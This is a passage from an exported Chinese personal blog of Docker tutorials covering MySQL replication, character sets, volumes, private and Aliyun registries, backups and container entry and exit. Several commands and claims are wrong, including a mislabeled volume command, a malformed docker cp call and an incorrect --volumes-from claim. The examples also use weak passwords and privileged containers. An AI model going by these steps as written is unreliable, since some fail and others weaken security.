生成主数据库容器\n\n```bash\ndocker run -d -p 3307:3306 \\\n--privileged=true \\\n-v /docker/mysql-master/log:/var/log/mysql \\\n-v /docker/mysql-master/data:/var/lib/mysql \\\n-v /docker/mysql-master/conf:/etc/mysql/conf.d \\\n-e MYSQL_ROOT_PASSWORD=admin \\\n--name mysql-master \\\nmysql:latest\n```\n\n具体的参数详解，可以查看[这篇文章](https://nustarain.gitee.io/2023/08/10/DockerMySQL/#more)\n\n实现效果：\n\n```bash\nroot@knight:/docker# docker ps\nCONTAINER ID   IMAGE          COMMAND                  CREATED         STATUS         PORTS                                                  NAMES\na1f6f6e03029   mysql:latest   \"docker-entrypoint.s…\"   6 seconds ago   Up 5 seconds   33060/tcp, 0.0.0.0:3307->3306/tcp, :::3307->3306/tcp   mysql-master\n```\n\n3. 添加配置文件\n\n进入`/docker/mysql-master/conf`目录，编辑配置文件`my.cnf`，插入以下内容：\n\n```bash 折叠代码\n[mysqld]\n## 设置server_id，同一局域网中需要唯一\nserver_id=101 \n## 指定不需要同步的数据库名称\nbinlog-ignore-db=mysql  \n## 开启二进制日志功能\nlog-bin=com-mysql-bin  \n## 设置二进制日志使用内存大小（事务）\nbinlog_cache_size=1M  \n## 设置使用的二进制日志格式（mixed,statement,row）\nbinlog_format=mixed  \n## 二进制日志过期清理时间。默认值为0，表示不自动清理。\nexpire_logs_days=7  \n## 跳过主从复制中遇到的所有错误或指定类型的错误，避免slave端复制中断。\n## 如：1062错误是指一些主键重复，1032错误是因为主从数据库数据不一致\nslave_skip_errors=1062\n```\n\n4. 重启容器\n\n```bash\ndocker restart mysql-master\n```\n\n5. 进入容器\n\n```bash\ndocker exec -it mysql-master /bin/bash\n```\n\n6. 授权用户\n\n进入数据库，添加授权用户。\n\n```sql\nCREATE USER 'slave'@'%' IDENTIFIED BY '123456';\nGRANT REPLICATION SLAVE, REPLICATION CLIENT ON *.* TO 'slave'@'%';\n```\n\n实现效果：\n\n```sql\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nmysql> CREATE USER 'slave'@'%' IDENTIFIED BY '123456';\nQuery OK, 0 rows affected (0.03 sec)\n\nmysql> GRANT REPLICATION SLAVE, REPLICATION CLIENT ON *.* TO 'slave'@'%';\nQuery OK, 0 rows affected (0.02 sec)\n```\n\n7. 查看主数据库的主状态\n\n```sql\nmysql> show master status;\n+----------------------+----------+--------------+------------------+-------------------+\n| File                 | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set |\n+----------------------+----------+--------------+------------------+-------------------+\n| com-mysql-bin.000001 |      156 |              | mysql            |                   |\n+----------------------+----------+--------------+------------------+-------------------+\n1 row in set (0.00 sec)\n```\n\n8. 创建从数据库容器\n\n```bash\ndocker run -d -p 3308:3306 \\\n--privileged=true \\\n-v /docker/mysql-slave/log:/var/log/mysql \\\n-v /docker/mysql-slave/data:/var/lib/mysql \\\n-v /docker/mysql-slave/conf:/etc/mysql/conf.d \\\n-e MYSQL_ROOT_PASSWORD=admin \\\n--name mysql-slave \\\nmysql:latest\n```\n\n9. 实现效果：\n\n```bash\nroot@knight:/docker# docker ps\nCONTAINER ID   IMAGE          COMMAND                  CREATED              STATUS              PORTS                                                  NAMES\n06a84db29686   mysql:latest   \"docker-entrypoint.s…\"   3 seconds ago        Up 2 seconds        33060/tcp, 0.0.0.0:3308->3306/tcp, :::3308->3306/tcp   mysql-slave\na1f6f6e03029   mysql:latest   \"docker-entrypoint.s…\"   About a minute ago   Up About a minute   33060/tcp, 0.0.0.0:3307->3306/tcp, :::3307->3306/tcp   mysql-master\n```\n\n10. 添加配置文件\n\n进入`/docker/mysql-slave/conf`目录，编辑配置文件`my.cnf`，插入以下内容：\n\n```bash\n[mysqld]\n## 设置server_id，同一局域网中需要唯一\nserver_id=102\n## 指定不需要同步的数据库名称\nbinlog-ignore-db=mysql  \n## 开启二进制日志功能，以备Slave作为其它数据库实例的Master时使用\nlog-bin=com-mysql-slave1-bin  \n## 设置二进制日志使用内存大小（事务）\nbinlog_cache_size=1M  \n## 设置使用的二进制日志格式（mixed,statement,row）\nbinlog_format=mixed  \n## 二进制日志过期清理时间。默认值为0，表示不自动清理。\nexpire_logs_days=7  \n## 跳过主从复制中遇到的所有错误或指定类型的错误，避免slave端复制中断。\n## 如：1062错误是指一些主键重复，1032错误是因为主从数据库数据不一致\nslave_skip_errors=1062  \n## relay_log配置中继日志\nrelay_log=com-mysql-relay-bin  \n## log_slave_updates表示slave将复制事件写进自己的二进制日志\nlog_slave_updates=1  \n## slave设置为只读（具有super权限的用户除外）\nread_only=1\n```\n\n11. 重启容器\n\n```bash\ndocker restart mysql-slave\n```\n\n12. 在从数据库中配置主从复制\n\n进入容器\n\n```bash\ndocker exec -it mysql-slave /bin/bash\n```\n\n进入数据库\n\n```bash\nmysql -u root -padmin\n```\n\n开启复制功能\n\n```sql\nchange master to master_host='192.168.1.42', master_user='slave', master_password='123456', master_port=3307, master_log_file='com-mysql-bin.000001', master_log_pos=156, master_connect_retry=30;\n```\n\n上面的宿主机ip需要根据实际情况修改。\n\n主从复制参数说明：\n\n* master_host：主数据库的IP地址；\n* master_port：主数据库的运行端口；\n* master_user：在主数据库创建的用于同步数据的用户账号；\n* master_password：在主数据库创建的用于同步数据的用户密码；\n* master_log_file：指定从数据库要复制数据的日志文件，通过查看主数据的状态，获取File参数；\n* master_log_pos：指定从数据库从哪个位置开始复制数据，通过查看主数据的状态，获取Position参数；\n* master_connect_retry：连接失败重试的时间间隔，单位为秒。\n\n13. 在从数据库中开启主从同步\n\n```sql\nstart slave;\n```\n\n14. 查看从数据库状态\n\n```sql\nshow slave status \\G;\n```\n\n```sql 折叠代码\nmysql> show slave status \\G\n*************************** 1. row ***************************\n               Slave_IO_State: Connecting to source\n                  Master_Host: 192.168.1.42\n                  Master_User: slave\n                  Master_Port: 3307\n                Connect_Retry: 30\n              Master_Log_File: com-mysql-bin.000001\n          Read_Master_Log_Pos: 156\n               Relay_Log_File: com-mysql-relay-bin.000001\n                Relay_Log_Pos: 4\n        Relay_Master_Log_File: com-mysql-bin.000001\n             Slave_IO_Running: Yes\n            Slave_SQL_Running: Yes\n              Replicate_Do_DB: \n          Replicate_Ignore_DB: \n```\n\n15. 主从复制测试\n\n主库新建库、新建表、插入数据：\n\n```sql\ncreate database db108;\nuse db108;\ncreate table t1 (id int,name varchar(20));\ninsert into t1 values(1,'liuxp');\nselect * from t1;\n```\n\n从库查看库、查看记录，看主从同步是否成功:\n\n```sql\nshow databases;\nuse db108;\nselect * from t1;\n```","tags":["Docker","MySQL"],"categories":["技术"]},{"title":"解决Docker搭建MySQL的中文乱码问题","url":"/2023/08/10/DockerMySQL-Utf8/","content":"\n利用Docker搭建的MySQL，如果不进行额外的设置，默认是不支持在表里插入中文字符的，在实际的生产环境中，这是不允许出现的情况，要解决这个问题，主要的一个核心思想是：在容器中的`/etc/mysql/conf.d`目录下添加文件`my.cnf`。\n\n提供以下几种方法：\n\n### 方法一\n\n如果在生成容器时，使用-v 选项指定了容器和主机之间的配置文件的映射，那么直接在主机相应的目录下直接进行操作即可。\n\n<!-- more -->\n\n比如：\n\n```bash\ndocker run -d -p 3306:3306 --privileged=true -v /docker/mysql/log:/var/log/mysql -v /docker/mysql/data:/var/lib/mysql -v /docker/mysql/conf:/etc/mysql/conf.d -e MYSQL_ROOT_PASSWORD=admin --name mysql-1 mysql:latest \n```\n\n在这个例子中，使用-v 选项将主机/docker/mysql/conf和容器的/etc/mysql/conf.d进行映射，那么直接执行：\n\n```bash\ncd /docker/mysql/conf\nvim my.cnf\n```\n\n在文件中插入：\n\n```bash\n[client]\ndefault_character_set = utf8\n[mysqld]\ncollation_server = utf8_general_ci\ncharacter_set_server = utf8\n```\n\n保存退出后重启容器：\n\n```bash\ndocker restart mysql-1\n```\n\n### 方法二\n\n在生成容器的时候没有进行配置文件目录的映射：\n\n1. 进入容器：\n\n```bash\ndocker exec -it mysql-1 /bin/bash\n```\n\n2. 下载软件包vim\n\n此时，我们的目的是向`/etc/mysql/conf.d`目录下添加`my.cnf`配置文件，但是目前容器中并不存在vim软件包，下载软件包可以参考[这篇文章](https://nustarain.gitee.io/2023/08/09/ContainerDownloadSoft/)。\n\n也可以直接执行下面的命令：\n\n```bash\napt-get update\napt install -y vim\n```\n\n3. 等待安装完成后\n\n```bash\ncd /etc/mysql/conf.d\nvim my.cnf\n```\n\n在文件中插入：\n\n```bash\n[client]\ndefault_character_set = utf8\n[mysqld]\ncollation_server = utf8_general_ci\ncharacter_set_server = utf8\n```\n\n4. 重启容器\n\n```bash\ndocker restart mysql-1\n```\n\n### 方法三\n\n1. 在主机本地编辑文件`my.cnf`。\n\n2. 插入内容：\n\n```bash\n[client]\ndefault_character_set = utf8\n[mysqld]\ncollation_server = utf8_general_ci\ncharacter_set_server = utf8\n```\n\n3. 拷贝文件至容器\n\n```bash\ndocker cp mysql-1 ./my.cnf /etc/mysql/conf.d\n```\n\n4. 重启容器\n\n```bash\ndocker restart mysql-1\n```\n\n### 检查配置文件是否生效\n\n进入容器，进入数据库，输入：\n\n```bash\nSHOW VARIABLES LIKE 'character%';\n```\n\n回车出现以下，修改成功：\n\n```bash 折叠代码\nmysql> SHOW VARIABLES LIKE 'character%';\n+--------------------------+--------------------------------+\n| Variable_name            | Value                          |\n+--------------------------+--------------------------------+\n| character_set_client     | utf8mb3                        |\n| character_set_connection | utf8mb3                        |\n| character_set_database   | utf8mb3                        |\n| character_set_filesystem | binary                         |\n| character_set_results    | utf8mb3                        |\n| character_set_server     | utf8mb3                        |\n| character_set_system     | utf8mb3                        |\n| character_sets_dir       | /usr/share/mysql-8.0/charsets/ |\n+--------------------------+--------------------------------+\n8 rows in set (0.00 sec)\n```","tags":["Docker","MySQL"],"categories":["技术"]},{"title":"利用Docker搭建MySQL服务器（实战版）","url":"/2023/08/10/DockerMySQL/","content":"\n\n\n### 操作步骤\n\n1. 拉取镜像\n\n```bash\ndocker pull mysql\n```\n\n<!-- more -->\n\n2. 生成容器\n\n```bash\ndocker run -d -p 3306:3306 --privileged=true -v /docker/mysql/log:/var/log/mysql -v /docker/mysql/data:/var/lib/mysql -v /docker/mysql/conf:/etc/mysql/conf.d -e MYSQL_ROOT_PASSWORD=admin --name mysql-1 mysql:latest \n```\n\n* -d 后台运行\n\n* -p 端口映射，将本机的3306，映射为容器的3306端口，需要注意的是，如果本机已经装了MySQL，本机3306端口已经被占用的话，需要改变监听的端口。\n\n* -v /docker/mysql/log:/var/log/mysql 数据库服务的日志目录映射\n\n* -v /docker/mysql/data:/var/lib/mysql 数据库服务的数据库数据映射\n\n* -v /docker/mysql/conf:/etc/mysql/conf.d 数据库服务的配置文件映射\n\n* -e 指定数据库服务的密码\n\n* --name 指定容器名称\n\n3. 验证生成\n\n```bash\ndocker ps\n```\n\n4. 进入容器\n\n```bash\ndocker exec -it mysql-1 /bin/bash\n```\n\n5. 进入数据库\n\n```bash\nmysql -u root -padmin\n```\n\n* -p 输入生成容器时设置的密码，-p和密码之间不能有空格","tags":["Docker","MySQL"],"categories":["学习过程"]},{"title":"Docker数据卷详解","url":"/2023/08/10/DockerVolume/","content":"\n### 数据卷介绍\n\n容器数据卷(Container Volumes)是Docker用于持久化和共享容器数据的一种机制。它允许您在容器之间共享文件/文件夹,并且对容器生命周期之外的数据进行持久化存储。\n\n主要特点包括:\n\n- 数据共享 - 容器之间可以通过数据卷来共享数据。多个容器可以同时挂载一个数据卷,实现数据共享。\n\n<!-- more -->\n\n- 数据持久化 - 数据卷的生命周期独立于容器,即使容器被删除,数据卷中的数据也不会丢失。\n\n- 数据加密 - 可以对 Docker 数据卷内容进行加密,保证数据安全性。\n\n- 性能优势 - 容器绕过 Union File System,可以直接操作数据卷,提高IO性能。\n\n- 挂载宿主目录 - 可以将宿主机上的目录作为数据卷挂载到容器中,实现容器访问宿主机文件。\n\n使用数据卷的场景包括需要保存容器数据、需要在容器之间共享文件、需要备份、恢复或迁移数据等。总之,容器数据卷为容器提供了持久化存储和数据共享能力。\n\n### 简单使用\n\n```bash\ndocker run -d -p 6603:3306 -v /home/mysql/conf:/etc/mysql/conf.d -v /home/mysql/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 --name mysql01 mysql:5.7\n```\n\n使用-v选项来对主机目录和容器内的目录进行映射，使用冒号间隔。\n\n映射后，从无论是主机部分新建的文件，还是容器内新建的文件，都可以实时在映射对方实现互通有无。\n\n### 常用命令\n\n1. 删除数据卷\n\n```bash\ndocker volume create my-vol\n```\n\n2. 查看所有的数据卷\n\n```bash\ndocker volume ls\n```\n\n3. 查看指定数据卷的信息\n\n```bash\ndocker volume inspect my-vol\n```\n\n4. 删除数据卷\n\n```bash\ndocker volume rm my-vol\n```\n\n5. 清理无主的数据卷\n\n```bash\ndocker volume prune\n```\n\n6. 使用 --mount创建数据卷\n\n挂载一个主机目录作为数据卷。使用 --mount 标记可以指定挂载一个本地主机的目录到容器中去。\n\n```bash\ndocker run -d --name test \\\n    --mount type=bind,source=/host/path,target=/container/path \\\n    nginx:latest\n```\n\n这个例子中,会将主机路径 /host/path 挂载到容器内的 /container/path,实现在主机和容器之间共享这个目录。\n\n另一个例子:\n\n```bash\ndocker run -d --name test \\\n   --mount type=bind,source=$(pwd)/config.json,target=/app/config.json \\\n   myapp:latest\n```\n\n这将主机当前目录下的 config.json 文件挂载到容器的 /app/config.json。挂载单个文件作为数据卷,提供一种配置注入的方式。\n\n总之,--mount 参数提供了一个在 docker run 时直接挂载主机目录的简便方法,避免了使用额外的 docker volume 命令。\n\n### 具名挂载和匿名挂载\n\n具名挂载(Named Volumes)和匿名挂载(Anonymous Volumes)是Docker中的两种数据卷方式。\n\n具名挂载:\n\n需要通过docker volume create命令显式地创建。\n卷的名称可以被用户自定义。\n生命周期独立于容器,容器删除后卷仍然存在。\n可以被多个容器同时挂载使用。\n\n匿名挂载:\n\n在docker run命令中通过-v参数隐式创建。\n名称随机生成,用户不可自定义。\n生命周期依赖于容器,容器删除后匿名卷也会被删除。\n仅供一个容器专有使用。\n\n具名挂载(Named Volumes)和匿名挂载(Anonymous Volumes)都是Docker的数据卷,主要区别如下:\n\n1. 定义方式不同\n\n具名挂载需要通过docker volume create命令显式创建。\n匿名挂载可以通过docker run命令隐式创建。\n\n2. 生命周期不同\n\n具名挂载的生命周期独立于容器,容器删除后卷仍然存在。\n匿名挂载的生命周期和容器一致,容器删除后匿名卷也会被删除。\n\n3. 使用方式不同\n\n具名挂载可以被多个容器同时挂载使用。\n匿名挂载仅供一个容器专有使用。\n\n例子：\n\n具名挂载:\n\n```bash\ndocker volume create my-vol\ndocker run -v my-vol:/opt container\n```\n\n匿名挂载:\n\n```bash\ndocker run -v /opt container\n```\n\n上面在运行容器时分别使用了具名挂载my-vol和匿名挂载/opt,它们的生命周期和作用范围不同。\n\n### 数据卷的共享\n\n--volumes-from参数可以实现Docker容器之间的数据卷共享。\n\n其作用是将指定容器挂载的数据卷,挂载到当前容器中,实现多容器间的卷共享。\n\n例如:\n\n1. 创建一个命名为 vol1 的数据卷\n\n```bash\n# 容器dbdata挂载名为dbvol的数据卷 \ndocker run -d --name dbdata -v dbvol:/dbdata mysql\n\n# 容器webapp使用--volumes-from来挂载dbdata中的数据卷\ndocker run -d --name webapp --volumes-from dbdata nginx\n```\n\n上面通过--volumes-from dbdata,实现了容器webapp继承容器dbdata的卷挂载配置。webapp也可以访问dbvol的数据卷了。\n\n需要注意的是,--volumes-from Parameters会继承前容器所有卷的挂载配置,包括匿名和具名的。\n\n如果仅想共享指定的命名卷,可以用--volumes-from加上容器名称和卷名的组合实现,例如:\n\n```bash\n--volumes-from dbdata:dbvol\n```","tags":["Docker"],"categories":["学习过程"]},{"title":"Docker镜像推送到私有仓库","url":"/2023/08/09/DockerPushLocal/","content":"\n在实际的生产条件中，公司会用到涉及公司内部的资料，并不希望将镜像挂在公共的仓库，那就需要一个私有的容器仓库来存放打包的镜像，本节记录如何创建本地私有镜像仓库，并上传下载镜像。\n\n1. 拉取镜像\n\n执行以下命令：\n\n```bash\ndocker pull registry\n```\n\n<!-- more -->\n\n2. 运行容器\n\n下载完镜像之后同样需要先把镜像运行起来，执行下面的命令：\n\n```bash\ndocker run -d -p 5000:5000 -v /docker/registry/:/tmp/registry --privileged=true --name registry-1 registry\n```\n\n* -d 守护进程运行（后台运行）\n\n* -v 数据卷映射，把本地的`/docker/registry/`映射为容器的`/tmp/registry`。\n\n* --privileged=true，container内的root拥有真正的root权限。具体解释参考[这篇文章](https://blog.csdn.net/wangxuelei036/article/details/107457712)。\n\n* --name 指定容器的名字，不设置会由系统随机分配一个。\n\n3. 测试仓库可用性\n\n当前我电脑的IP为：192.168.1.42。\n\n```bash\ncurl -XGET http://192.168.1.42:5000/v2/_catalog\n```\n\n下面的例子可以看到当前本地私有仓库中并没有任何的镜像，出现`{\"repositories\":[]}`,表示本地私有仓库可用。\n\n```bash\nroot@knight:/# curl -XGET http://192.168.1.42:5000/v2/_catalog\n{\"repositories\":[]}\n```\n\n4. 生成镜像\n\n更新一个镜像，并重新commit生成一个镜像，具体生成镜像的方法可以参考[这篇文章](https://nustarain.gitee.io/2023/08/09/ContainerCommit/)\n\n比如，我利用mynginx:1.0重新生成了版本号为1.1的mynginx镜像：\n\n```bash\nroot@knight:/# docker commit -m \"add net-tools package\" -a \"lxp\" nginx-1 mynginx:1.1\nsha256:f35ce030ad1119c6fe4a1398386048ad51471e80a672c55912b46f157d1554c2\nroot@knight:/# docker images\nREPOSITORY       TAG       IMAGE ID       CREATED          SIZE\nmynginx          1.1       f35ce030ad11   11 seconds ago   198MB\nmynginx          1.0       ff65638c821e   5 hours ago      196MB\n```\n\n5. 更改镜像名称\n\n上传到本地私有仓库需要满足一定的镜像名称上传规范，需要对mynginx:1.1进行改名：\n\n当前我电脑的IP为：192.168.1.42。\n\n```bash\ndocker tag mynginx:1.1 192.168.1.42:5000/mynginx:1.1\n```\n\n效果如下：\n\n```bash\nroot@knight:/# docker tag mynginx:1.1 192.168.1.42:5000/mynginx:1.1 \nroot@knight:/# docker images\nREPOSITORY                  TAG       IMAGE ID       CREATED          SIZE\n192.168.1.42:5000/mynginx   1.1       f35ce030ad11   13 minutes ago   198MB\nmynginx                     1.1       f35ce030ad11   13 minutes ago   198MB\nmynginx                     1.0       ff65638c821e   5 hours ago      196MB\n```\n\n可以看出，修改tag之后，并不是将原来的镜像直接更名，而是克隆出一个更名的镜像。\n\n6. 修改配置文件\n\n在docker中默认不支持http协议，所以需要我们手动修改配置文件，以支持http协议。\n\n例：\n\n```bash\nroot@knight:/# cat /etc/docker/daemon.json \n{\n  \"registry-mirrors\": [\"https://az7a5oso.mirror.aliyuncs.com\"],\n  \"insecure-registries\": [\"192.168.1.42:5000\"]\n}\n```\n\n* registry-mirrors 是加速用的。\n\n* insecure-registries 是开启http协议的。\n\n配置完成后如果不生效，尝试`systemctl daemon-reload`。\n\n如果还是不行，尝试`systemctl restart docker`，实际生产环境中，很少会直接重启docker，因为重启后，所有的容器都会停止，所以这条命令一定要放在最后。\n\n如果重启了docker，不要忘记步骤2，重新运行容器。\n\n7. 上传到私有仓库\n\n```bash\ndocker push 192.168.1.42:5000/mynginx:1.1 \n```\n\n例子：\n\n```bash\nroot@knight:/# docker push 192.168.1.42:5000/mynginx:1.1 \nThe push refers to repository [192.168.1.42:5000/mynginx]\n0033c6e89448: Pushed \nd874fd2bc83b: Pushed \n32ce5f6a5106: Pushed \nf1db227348d0: Pushed \nb8d6e692a25e: Pushed \ne379e8aedd4d: Pushed \n2edcec3590a4: Pushed \n1.1: digest: sha256:e8c89fef743b31184833c6e08d0415c3e5cdd38770dcb584b1ad6173c64df4a4 size: 1782\n```\n\n8. 验证仓库镜像\n\n```bash\nroot@knight:/# curl -XGET http://192.168.1.42:5000/v2/_catalog\n{\"repositories\":[\"mynginx\"]}\n```\n\n可以看到现在仓库中已经存在“mynginx”的镜像了。\n\n9. PULL到本地使用\n\n```\ndocker pull 192.168.1.42:5000/mynginx:1.1\n```\n\n例子：\n\n```bash 折叠代码\nroot@knight:/# docker images\nREPOSITORY                  TAG       IMAGE ID       CREATED             SIZE\n192.168.1.42:5000/mynginx   1.1       f35ce030ad11   About an hour ago   198MB\nmynginx                     1.1       f35ce030ad11   About an hour ago   198MB\nnginx                       latest    605c77e624dd   19 months ago       141MB\nregistry                    latest    b8604a3fe854   21 months ago       26.2MB\nroot@knight:/# docker rmi 192.168.1.42:5000/mynginx:1.1 \nUntagged: 192.168.1.42:5000/mynginx:1.1\nUntagged: 192.168.1.42:5000/mynginx@sha256:e8c89fef743b31184833c6e08d0415c3e5cdd38770dcb584b1ad6173c64df4a4\nroot@knight:/# docker images\nREPOSITORY   TAG       IMAGE ID       CREATED             SIZE\nmynginx      1.1       f35ce030ad11   About an hour ago   198MB\nnginx        latest    605c77e624dd   19 months ago       141MB\nregistry     latest    b8604a3fe854   21 months ago       26.2MB\nroot@knight:/# docker pull 192.168.1.42:5000/mynginx:1.1\n1.1: Pulling from mynginx\nDigest: sha256:e8c89fef743b31184833c6e08d0415c3e5cdd38770dcb584b1ad6173c64df4a4\nStatus: Downloaded newer image for 192.168.1.42:5000/mynginx:1.1\n192.168.1.42:5000/mynginx:1.1\nroot@knight:/# docker images\nREPOSITORY                  TAG       IMAGE ID       CREATED             SIZE\n192.168.1.42:5000/mynginx   1.1       f35ce030ad11   About an hour ago   198MB\nmynginx                     1.1       f35ce030ad11   About an hour ago   198MB\nnginx                       latest    605c77e624dd   19 months ago       141MB\nregistry                    latest    b8604a3fe854   21 months ago       26.2MB\n```","tags":["Docker"],"categories":["学习过程"]},{"title":"Docker镜像推送到阿里云","url":"/2023/08/09/DockerPushAliyun/","content":"\n在自己本地生产需要的Docker镜像，只留在本地只能供自己使用，而在团队协作的过程中，更多的要发挥文件共享的优势，那么就需要把Docker镜像推送到远端仓库，作为一个共享的资源。Docker Hub 确实是一个不错的工具，但是作为国内用户来讲，不是很友好，那么在阿里云迅猛发展的今天，也给我们提供了不错的解决方案。所以，最后决定把阿里云仓库作为docker镜像的选择。\n\n### 操作步骤\n\n1. 需要拥有一个阿里云旗下的一个账号，支付宝，淘宝等等都可以。浏览器搜索`aliyun.com`。\n\n<!-- more -->\n\n2. 登录完成后，进入容器镜像服务。\n\n![登录](./DockerPushAliyun/1.png)\n\n3. 实例列表选择个人版，进入后创建命名空间。\n\n![登录](./DockerPushAliyun/2.png)\n\n4. 然后创建镜像仓库。\n\n![登录](./DockerPushAliyun/3.png)\n\n5. 创建完成后，点击镜像仓库右侧的管理。\n\n![登录](./DockerPushAliyun/4.png)\n\n6. 这里面是可能会用到的命令。\n\n![登录](./DockerPushAliyun/5.png)\n\n7. 附上自己的仓库，纯粹为了方便自己。\n\n* 登录阿里云Docker Registry：\n\n```bash\ndocker login --username=knight731 registry.cn-hangzhou.aliyuncs.com\n```\n\n* 从Registry中拉取镜像:\n\n```bash\ndocker pull registry.cn-hangzhou.aliyuncs.com/knight731/nginx:[镜像版本号]\n```\n\n* 将镜像推送到Registry:\n\n```bash\ndocker login --username=knight731 registry.cn-hangzhou.aliyuncs.com\n```\n\n```bash\ndocker tag [ImageId] registry.cn-hangzhou.aliyuncs.com/knight731/nginx:[镜像版本号]\n```\n \n```bash\ndocker push registry.cn-hangzhou.aliyuncs.com/knight731/nginx:[镜像版本号]\n```","tags":["Docker"],"categories":["学习过程"]},{"title":"将更改过的容器导出为镜像","url":"/2023/08/09/ContainerCommit/","content":"\n执行命令：\n\n```bash\ndocker commit -m \"add vim package\" -a \"liuxp\" 容器ID 容器名:版本号\n```\n\n* -m 添加提交描述。\n\n* -a 指明提交人。 ","tags":["Docker"],"categories":["学习过程"]},{"title":"容器中下载软件包","url":"/2023/08/09/ContainerDownloadSoft/","content":"\n每个容器都相当于一台单独linux机器。也正因为容器的轻便型，部署好容器后，非常多的软件都是不存在的，需要自己按需下载。\n\n一般的步骤是：\n\n1. 执行命令：\n\n```bash\napt-get update\n```\n\n2. 等待软件包缓存更新完毕，执行下载命令，比如：\n\n```bash\napt install -y vim\n```","tags":["Docker"],"categories":["学习过程"]},{"title":"Docker重要数据备份","url":"/2023/08/08/DockerBackup/","content":"\n生产环境中，免不了会出现一些误操作，导致Docker开发重要文件或者数据的丢失，那么做好重要数据的备份是免不了的。主要就是重要的配置文件，甚至已经生成的重要的容器，后者更简单粗暴。\n\n### 拷贝容器的配置文件\n\n```bash\ndocker cp 容器ID:/tmp/a.txt /home/admin\n```\n\n例子：\n\n<!-- more -->\n\n将nginx-1容器的NGINX配置文件拷贝到当前目录下\n\n```bash\nroot@knight:/docker/nginx# ls\nroot@knight:/docker/nginx# docker ps\nCONTAINER ID   IMAGE          COMMAND                  CREATED          STATUS          PORTS     NAMES\nc2dbddec15d3   mynginx:0.1    \"/bin/bash\"              44 minutes ago   Up 25 minutes             nginx-1\nroot@knight:/docker/nginx# docker cp nginx-1:/etc/nginx/nginx.conf ./\nroot@knight:/docker/nginx# ls\nnginx.conf\nroot@knight:/docker/nginx# \n```\n\n### 容器的导入与导出\n\n导出容器（默认是导出到当前目录下）：\n\n```bash\ndocker export 容器ID > xxx.tar\n```\n\n例子：\n\n```bash\nroot@knight:/docker# ls\nroot@knight:/docker# docker ps\nCONTAINER ID   IMAGE          COMMAND                  CREATED          STATUS          PORTS     NAMES\nc2dbddec15d3   mynginx:0.1    \"/bin/bash\"              51 minutes ago   Up 31 minutes             nginx-1\nroot@knight:/docker# docker export nginx-1 > nginx-1.tar\nroot@knight:/docker# ls\nnginx-1.tar\nroot@knight:/docker# \n```\n\n导入容器：\n\n```bash\ncat xxx.tar | docker import - [用户名/]镜像名:版本号\n```\n\n例子：\n\n导入nginx-1.tar这个容器\n\n```bash\nroot@knight:/docker# ls\nnginx-1.tar\nroot@knight:/docker# docker images\nREPOSITORY    TAG       IMAGE ID       CREATED         SIZE\nroot@knight:/docker# cat nginx-1.tar | docker import - knight/nginx-1:0.1\nsha256:f82cc108516521700a6d74e03e26be639131a5d361c66b50f923ba00a1df8fe3\nroot@knight:/docker# docker images\nREPOSITORY       TAG       IMAGE ID       CREATED         SIZE\nknight/nginx-1   0.1       f82cc1085165   4 seconds ago   140MB\nroot@knight:/docker# \n```","tags":["Docker"],"categories":["学习过程"]},{"title":"两种进入和退出容器的方法以及它们之间的区别","url":"/2023/08/08/ExitContainer/","content":"\n### 进入容器的两种方法\n\n两种进入容器的方法分别是使用`exec`he`attach`两种方法。\n\n具体如下：\n\n* 使用`exec`的方式\n\n```bash\ndocker exec -it nginx-1 /bin/bash\n```\n\n* 使用`attach`的方式\n\n<!-- more -->\n\n```bash\ndocker attach nginx-1\n```\n\n### 进入容器两种方法的区别\n\n从下面的例子来看这两种进入容器的区别：\n\n```bash 折叠代码\nroot@knight:/docker# docker ps \nCONTAINER ID   IMAGE         COMMAND       CREATED          STATUS          PORTS     NAMES\nc2dbddec15d3   mynginx:0.1   \"/bin/bash\"   21 seconds ago   Up 20 seconds             nginx-1\nroot@knight:/docker# docker exec -it nginx-1 /bin/bash\nroot@c2dbddec15d3:/# exit\nexit\nroot@knight:/docker# docker ps\nCONTAINER ID   IMAGE         COMMAND       CREATED         STATUS         PORTS     NAMES\nc2dbddec15d3   mynginx:0.1   \"/bin/bash\"   2 minutes ago   Up 2 minutes             nginx-1\nroot@knight:/docker# docker attach nginx-1\nroot@c2dbddec15d3:/# exit\nexit\nroot@knight:/docker# docker ps\nCONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES\nroot@knight:/docker# \n```\n\n可以观察到以下几点区别：\n\n1. 进入容器的命令指定的参数不一样，exec更复杂一点，需要指定一些参数。\n\n2. 使用exec进去的容器，exit退出之后，容器仍然运行，但是使用attach进入的容器，exit退出之后，容器直接停止了。\n\n原因如下：\n\n1. exec在进入容器时，会在容器里额外打开一个bash，当退出时，会停用当前的这个bash，也就是说，容器中还会有之前的bash在运行，有bash就有进程，有进程就不会停止容器。这也就是为什么exec在进入容器时，要指定一个解释器的原因。\n\n2. 使用attach进入容器时，会直接进入容器当前存在的bash(解释器)，而不会打开新的解释器，而在退出的时候，则会关闭唯一存在的解释器，也就是说容器没有存在的进程了，容器就认为自己没有存在的价值了，就会自己停止。\n\n### 退出容器的两种方法\n\n玩容器比较少的可能只知道退出容器的方法只有`exit`命令，但是在容器退出的时候其实还有<kbd>Ctrl</kbd>+<kbd>p</kbd>+<kbd>q<kbd>方式退出。\n\n### 退出容器的两种方法的区别\n\n退出容器的区别有一个前提是构建这个容器的时候，没有指定-d选项。否则设置后台运行是没有任何区别的。\n\n从下面的例子来看这两种退出容器的区别：\n\n```bash 折叠代码\nroot@knight:/docker# docker images\nREPOSITORY    TAG       IMAGE ID       CREATED             SIZE\nmynginx       0.1       babef9096509   About an hour ago   140MB\nnginx         latest    605c77e624dd   19 months ago       141MB\nhello-world   latest    feb5d9fea6a5   22 months ago       13.3kB\nroot@knight:/docker# docker run -it --name nginx-2 nginx:latest /bin/bash\nroot@634746a9bd08:/# exit\nexit\nroot@knight:/docker# docker ps\nCONTAINER ID   IMAGE         COMMAND       CREATED          STATUS         PORTS     NAMES\nroot@knight:/docker# docker run -it --name nginx-3 nginx:latest /bin/bash\nroot@29ce1f7749cb:/# root@knight:/docker# docker ps\nCONTAINER ID   IMAGE          COMMAND                  CREATED          STATUS         PORTS     NAMES\n29ce1f7749cb   nginx:latest   \"/docker-entrypoint.…\"   9 seconds ago    Up 8 seconds   80/tcp    nginx-3\nroot@knight:/docker# \n```\n\n可以观察到：\n\n1. 在nginx-2这个容器中，使用exit退出之后，查看运行的容器，是查不到的，也就是说，退出意味着停止。\n\n2. 